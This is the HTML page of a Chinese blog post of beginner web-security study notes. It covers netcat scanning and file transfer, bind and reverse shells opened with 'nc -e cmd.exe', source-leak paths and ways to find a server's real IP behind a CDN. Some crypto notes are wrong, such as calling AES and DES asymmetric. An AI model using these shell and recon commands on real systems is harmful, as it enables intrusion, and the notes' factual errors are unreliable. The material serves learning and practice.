@@ -1,0 +1,1179 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="1.Nc瑞士军刀使用详解1.tcp监听123456789101112131415tcp监听nc可以作为server端启动一个tcp的监听，默认情况下下面监听的是一个tcp的端口nc -l -p 9999客户端测试1、在B机器上telnet A机器此端口，如下显示表示B机器可以访问A机器此端口telnet 10.0.1.161 99992、B机器上也可以使用nmap扫描A机器的此端口nmap 10.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web安全day1">
+<meta property="og:url" content="http://example.com/2023/12/15/web%E5%AE%89%E5%85%A81/index.html">
+<meta property="og:site_name" content="frozenfish&#39;blog">
+<meta property="og:description" content="1.Nc瑞士军刀使用详解1.tcp监听123456789101112131415tcp监听nc可以作为server端启动一个tcp的监听，默认情况下下面监听的是一个tcp的端口nc -l -p 9999客户端测试1、在B机器上telnet A机器此端口，如下显示表示B机器可以访问A机器此端口telnet 10.0.1.161 99992、B机器上也可以使用nmap扫描A机器的此端口nmap 10.">
+<meta property="og:locale">
+<meta property="article:published_time" content="2023-12-15T15:47:33.000Z">
+<meta property="article:modified_time" content="2024-01-21T16:44:13.536Z">
+<meta property="article:author" content="frozenfish">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2023/12/15/web安全1/"/>
+
+
+
+
+
+  <title>web安全day1 | frozenfish'blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">frozenfish'blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tool">
+          <a href="/tool/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-toolbox"></i> <br />
+            
+            menu.tool
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-bug">
+          <a href="/bug/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            menu.bug
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/15/web%E5%AE%89%E5%85%A81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="frozenfish'blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">web安全day1</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2023-12-15T23:47:33+08:00">
+                2023-12-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="1-Nc瑞士军刀使用详解"><a href="#1-Nc瑞士军刀使用详解" class="headerlink" title="1.Nc瑞士军刀使用详解"></a>1.Nc瑞士军刀使用详解</h1><h2 id="1-tcp监听"><a href="#1-tcp监听" class="headerlink" title="1.tcp监听"></a>1.tcp监听</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">tcp监听</span><br><span class="line">nc可以作为server端启动一个tcp的监听，默认情况下下面监听的是一个tcp的端口</span><br><span class="line">nc -l -p 9999</span><br><span class="line">客户端测试</span><br><span class="line">1、在B机器上telnet A机器此端口，如下显示表示B机器可以访问A机器此端口</span><br><span class="line">telnet 10.0.1.161 9999</span><br><span class="line">2、B机器上也可以使用nmap扫描A机器的此端口</span><br><span class="line">nmap 10.0.1.161 -p9999</span><br><span class="line">3、使用nc命令作为客户端工具进行端口探测</span><br><span class="line">nc -vz -w 2 10.0.1.161 9999</span><br><span class="line">（-v可视化，-z扫描时不发送数据，-w超时几秒，后面跟数字）</span><br><span class="line">服务端会自动关闭监听。</span><br><span class="line">4、nc可以扫描连续端口，这个作用非常重要。常常可以用来扫描服务器端口，然后给服务器安全加固</span><br><span class="line">在客户端B机器上扫描连续的两个端口，如下</span><br><span class="line">nc -vzw 2 10.0.1.161 9998-9999</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<h2 id="2-传文件"><a href="#2-传文件" class="headerlink" title="2.传文件"></a>2.传文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">方法1，先启动接收命令</span><br><span class="line">使用nc传输文件还是比较方便的，因为不用scp和rsync那种输入密码的操作了</span><br><span class="line">把A机器上的一个rpm文件发送到B机器上</span><br><span class="line">需注意操作次序，receiver先侦听端口，sender向receiver所在机器的该端口发送数据。 </span><br><span class="line">步骤1，先在B机器上启动一个接收文件的监听，格式如下</span><br><span class="line">意思是把赖在9995端口接收到的数据都写到file文件里（这里文件名随意取）</span><br><span class="line">格式：nc -l port &gt;file</span><br><span class="line">nc -l -p 9995 &gt;zabbix.rpm</span><br><span class="line">步骤2，在A机器上往B机器的9995端口发送数据，把下面rpm包发送过去</span><br><span class="line">nc 10.0.1.162 9995 &lt; zabbix-release-2.4-1.el6.noarch.rpm</span><br><span class="line">方法2，先启动发送命令</span><br><span class="line">步骤1，先在B机器上，启动发送文件命令</span><br><span class="line">下面命令表示通过本地的9992端口发送test.mv文件</span><br><span class="line">nc -l -p 9992 &lt;test.mv</span><br><span class="line">步骤2，A机器上连接B机器，取接收文件</span><br><span class="line">下面命令表示通过连接B机器的9992端口接收文件，并把文件存到本目录下，文件名为test2.mv</span><br><span class="line">nc 10.0.1.162 9992 &gt;test2.mv</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<!--more-->
+
+<h2 id="3-nc反弹shell"><a href="#3-nc反弹shell" class="headerlink" title="3.nc反弹shell"></a>3.nc反弹shell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">方法1、REMOTE主机绑定SHELL</span><br><span class="line">在公网监听</span><br><span class="line">nc -l -p 5354 -t -e c:\winnt\system32\cmd.exe</span><br><span class="line">或者</span><br><span class="line">nc -l -p 5555 -t -e cmd.exe</span><br><span class="line">在内网主动建立连接</span><br><span class="line">nc -nvv 192.168.153.138 5555</span><br><span class="line">-t是通过telne模式执行 cmd.exe 程序，可以省略。</span><br><span class="line">讲解：绑定REMOTE主机的CMDSHELL在REMOTE主机的TCP5354端口</span><br><span class="line">方法2、REMOTE主机绑定SHELL并反向连接</span><br><span class="line">在公网监听</span><br><span class="line">nc -lp 5555</span><br><span class="line">在内网机器反弹</span><br><span class="line">nc -t -e c:\winnt\system32\cmd.exe 192.168.x.x 5354</span><br><span class="line">或者</span><br><span class="line">nc -t -e cmd 192.168.153.140 5555</span><br><span class="line">讲解：绑定REMOTE主机的CMDSHELL并反向连接到192.168.x.x的TCP5354端口</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="2-加解密"><a href="#2-加解密" class="headerlink" title="2.加解密"></a>2.加解密</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">md5</span><br><span class="line"> 16位和32位 0-9 和a-f 组成的字符串</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> 解密：</span><br><span class="line"> 1.知道算法</span><br><span class="line"> 2.碰撞枚举生成密文</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> 有特殊情况。md5会加salt一个字符串。</span><br><span class="line"></span><br><span class="line">	discuz</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHA1</span><br><span class="line">和md5特征差不多，只是位数是40</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NTLM</span><br><span class="line">WINDOWS系统哈希密码，标准通讯安全协议</span><br><span class="line">win7之后使用的密码</span><br><span class="line">之前是LM</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aes，des，rc4</span><br><span class="line">都是非对称加密。印度密钥，密文特质与base64类似</span><br></pre></td></tr></table></figure>
+
+
+
+<p>大小写敏感</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 通常以=结尾、1-9 a-f</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url 通常以=结尾、1-9 a-f 通常以%数字字母分割 </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">编码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gbk，utf-8</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="颜文字加密：aaencode"><a href="#颜文字加密：aaencode" class="headerlink" title="颜文字加密：aaencode"></a>颜文字加密：aaencode</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jother： +()[]&#123;&#125;</span><br><span class="line">jsfuck是和jother很像。少了&#123;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="图片里包含文件的技术"><a href="#图片里包含文件的技术" class="headerlink" title="图片里包含文件的技术"></a>图片里包含文件的技术</h4><h1 id="3-判断操作系统"><a href="#3-判断操作系统" class="headerlink" title="3.判断操作系统"></a>3.判断操作系统</h1><h2 id="ttl"><a href="#ttl" class="headerlink" title="ttl"></a>ttl</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">WINDOWS NT/2000   TTL：128</span><br><span class="line">WINDOWS 95/98     TTL：32</span><br><span class="line">UNIX              TTL：255</span><br><span class="line">LINUX             TTL：64</span><br><span class="line">WIN7          	  TTL：64</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>nmap使用技术可以具体了解判定方法</p>
+<h1 id="4-数据库判定"><a href="#4-数据库判定" class="headerlink" title="4.数据库判定"></a>4.数据库判定</h1><p>​	端口扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql 3306</span><br><span class="line"></span><br><span class="line">oracle 1521</span><br><span class="line"></span><br><span class="line">sql server 1433</span><br><span class="line"></span><br><span class="line">db2 5000</span><br></pre></td></tr></table></figure>
+
+<h1 id="5-主动打点和被动打点"><a href="#5-主动打点和被动打点" class="headerlink" title="5.主动打点和被动打点"></a>5.主动打点和被动打点</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主动式信息打点：主动使用工具、主动发起测试流量等</span><br><span class="line">被动式信息打点：调用接口获取信息等</span><br></pre></td></tr></table></figure>
+
+<h1 id="6-收集"><a href="#6-收集" class="headerlink" title="6.收集"></a>6.收集</h1><ul>
+<li><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2></li>
+<li><h2 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h2></li>
+<li><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2></li>
+<li><h2 id="源码名称"><a href="#源码名称" class="headerlink" title="源码名称"></a>源码名称</h2></li>
+</ul>
+<h1 id="7-泄露原码（cms找不到的情况）"><a href="#7-泄露原码（cms找不到的情况）" class="headerlink" title="7.泄露原码（cms找不到的情况）"></a>7.泄露原码（cms找不到的情况）</h1><h2 id="git和svn"><a href="#git和svn" class="headerlink" title="git和svn"></a>git和svn</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">githack原理</span><br><span class="line">   .git</span><br><span class="line">svnhack原理</span><br><span class="line">   .svn</span><br></pre></td></tr></table></figure>
+
+<h2 id="目录备份"><a href="#目录备份" class="headerlink" title="目录备份"></a>目录备份</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目录扫描秒了</span><br></pre></td></tr></table></figure>
+
+<h2 id="DsStore"><a href="#DsStore" class="headerlink" title="DsStore"></a>DsStore</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mac的上传软件</span><br><span class="line">ds_store</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="PHP源码泄露"><a href="#PHP源码泄露" class="headerlink" title="PHP源码泄露"></a>PHP源码泄露</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">java有maven</span><br><span class="line">node.js有npm</span><br><span class="line">php有composer</span><br><span class="line">   composer.json配置文件</span><br><span class="line"> 		里面有配置信息。插件。中间件信息</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="WEB-INF-web-xml"><a href="#WEB-INF-web-xml" class="headerlink" title="WEB-INF&#x2F;web.xml"></a>WEB-INF&#x2F;web.xml</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web-inf 是java的web应用安全目录，要是想访问文件。必须在web.xml文件对要访问的文件进行映射 </span><br></pre></td></tr></table></figure>
+
+<h1 id="8-信息收集"><a href="#8-信息收集" class="headerlink" title="8.信息收集"></a>8.信息收集</h1><p>github的readme邮箱，版权声明。域名常用搜索。</p>
+<h1 id="9。端口扫描"><a href="#9。端口扫描" class="headerlink" title="9。端口扫描"></a>9。端口扫描</h1><ol>
+<li>网络架构。</li>
+<li>内网资产，内网协议</li>
+<li>阻碍信息，cdn，waf。负载，防火墙。</li>
+<li>端口（1-65535）</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap 协议。端口扫描。防火墙识别</span><br><span class="line">masscan 协议，端口扫描、</span><br></pre></td></tr></table></figure>
+
+<h1 id="10-端口渗透"><a href="#10-端口渗透" class="headerlink" title="10.端口渗透"></a>10.端口渗透</h1><h1 id="11-c段-旁注"><a href="#11-c段-旁注" class="headerlink" title="11.c段&#x2F;旁注"></a>11.c段&#x2F;旁注</h1><h2 id="旁注"><a href="#旁注" class="headerlink" title="旁注"></a>旁注</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">171.40.78.44</span><br><span class="line">www.123.com</span><br><span class="line">www.44.com</span><br><span class="line">www.54454.com</span><br></pre></td></tr></table></figure>
+
+<h2 id="c段"><a href="#c段" class="headerlink" title="c段"></a>c段</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">然后用ip反查查看绑定域名。可以进去看看资产</span><br><span class="line">同网段渗透</span><br></pre></td></tr></table></figure>
+
+<h1 id="cdn判断"><a href="#cdn判断" class="headerlink" title="cdn判断"></a>cdn判断</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">超级ping。全国各地ping一下秒了</span><br></pre></td></tr></table></figure>
+
+<h1 id="waf判断"><a href="#waf判断" class="headerlink" title="waf判断"></a>waf判断</h1><p><a target="_blank" rel="noopener" href="https://www.wangan.com/p/11v71302b8c5ab87">https://www.wangan.com/p/11v71302b8c5ab87</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">工具</span><br><span class="line"> wafw00f</span><br></pre></td></tr></table></figure>
+
+<h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">工具：</span><br><span class="line">	lbd</span><br></pre></td></tr></table></figure>
+
+<h1 id="cdn绕过"><a href="#cdn绕过" class="headerlink" title="cdn绕过"></a>cdn绕过</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.子域名查询。有些子域名没有加速cdn</span><br><span class="line">比如你直接访问 www.baidu.com</span><br><span class="line">他如果没买*.baidu.com</span><br><span class="line">那么访问test.baidu.com</span><br><span class="line">      baidu.com都会暴露真实ip</span><br><span class="line"> 注意！！！！！！！！当然这建立在主域名和子域名同个服务器。有些吊毛不这样做</span><br><span class="line">2.利用网站漏洞暴露真实ip</span><br><span class="line">3.历史dns记录</span><br><span class="line">4.MX</span><br><span class="line">5.国外请求(仅限中国大陆策略下)</span><br><span class="line">	全球cdn查询:tools.ipip.net</span><br><span class="line">	找冷们cdn。他一定不会部署cdn</span><br><span class="line">6.zmap</span><br><span class="line">7.网络空间搜索引擎：</span><br><span class="line">	zoomeye。fofa、shodan</span><br><span class="line">8.部分加速的就可以看网络请求包</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">漏洞&amp;遗留文件</span><br><span class="line">	像是有些配置文件。比如phpInfo.php里面就会配置ip地址.从而得知真实ip，适用于没有内网网卡。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1.传统访问：访问域名-&gt;dns-&gt;目标主机</span><br><span class="line">2.cdn瑞克派：访问域名-&gt;cdn-&gt;</span><br><span class="line">3.访问域名-&gt;-&gt;</span><br><span class="line">4. 主动邮件配合备案</span><br><span class="line">	让对方服务器主动发邮件给你（注册、找回密码等功能）</span><br><span class="line">5.抓APP包: </span><br><span class="line">	有时候网站使用了CDN，但是可能其APP没有使用，那么通过抓取APP的数据包有可能得出真实的IP地址</span><br><span class="line">6.国外第三方测试CDN网站（结合了几种方法于一身）</span><br><span class="line">	https://get-site-ip.com/</span><br><span class="line">7.查看历史解析IP</span><br><span class="line">	https://site.ip138.com/</span><br><span class="line">	https://viewdns.info/</span><br><span class="line">8.全网扫描FuckCDN(没有办法的办法)</span><br><span class="line">	厂商查询：</span><br><span class="line">		https://tools.ipip.net/cdn.php</span><br><span class="line">    IP库筛地址段</span><br><span class="line">		https://www.cz88.net/geo-public //IP库资源,要下载客户端</span><br><span class="line">	全网扫描：</span><br><span class="line">		https://github.com/Tai7sy/fuckcdn</span><br><span class="line">9.ssrf漏洞</span><br><span class="line">	想办法让对方主机访问你，你自己弄个web服务，监听个端口，记录日志。</span><br><span class="line">	然后通过漏洞·让对方访问你，于是就得到ip&#x27;了</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="牛逼的工具"><a href="#牛逼的工具" class="headerlink" title="牛逼的工具"></a>牛逼的工具</h3><p>​	get-site-ip.com</p>
+<h3 id="找到cdn后咋办？"><a href="#找到cdn后咋办？" class="headerlink" title="找到cdn后咋办？"></a>找到cdn后咋办？</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">绑定host文件直接指向真实ip</span><br><span class="line">后期测试测对地方</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="正向连接和反向连接"><a href="#正向连接和反向连接" class="headerlink" title="正向连接和反向连接"></a>正向连接和反向连接</h1><h2 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a><strong>正向连接</strong></h2><p>​		</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">正向连接是受害主机监听一个端口，由控制主机主动去连接受害主机的过程，适用于受害主机具有[公网ip](https://so.csdn.net/so/search?q=公网ip&amp;spm=1001.2101.3001.7020)的情况下。例如下面，受害主机具有公网ip，被控主机kali可以通过ip地址访问到受害主机，所以能够使用正相连接来控制受害主机。</span><br></pre></td></tr></table></figure>
+
+<h2 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a><strong>反向连接</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">反向连接是控制主机监听一个端口，由受害主机反向去连接控制主机的过程，适用于受害主机出网（或出网且没有公网ip）的情况。例如，受害主机是一台位于内网，并且没有公网ip且能访问互联网的主机，控制主机无法直接通过ip地址访问到受害主机。所以此时需要在控制主机上监听一个端口，让受害机主动连接控制主机，从而实现对控制主机的控制。</span><br><span class="line"></span><br><span class="line">由于正向连接是被攻击者主动连接攻击者，所以不受防火墙策略的限制</span><br></pre></td></tr></table></figure>
+
+<h1 id="逆向方向"><a href="#逆向方向" class="headerlink" title="逆向方向"></a>逆向方向</h1><h2 id="代码分析-抓包分析"><a href="#代码分析-抓包分析" class="headerlink" title="代码分析&amp;抓包分析"></a>代码分析&amp;抓包分析</h2><ol>
+<li><p>app&amp;&amp;小程序</p>
+<ol>
+<li><p>收集app里的所有地址，收集所有请求。api</p>
+</li>
+<li><p>oss阿里云的服务，他又他的客户端。存储资源</p>
+</li>
+</ol>
+</li>
+<li><p>抓包封包</p>
+</li>
+<li><p>逆向二进制</p>
+</li>
+<li><p>反框架检测</p>
+</li>
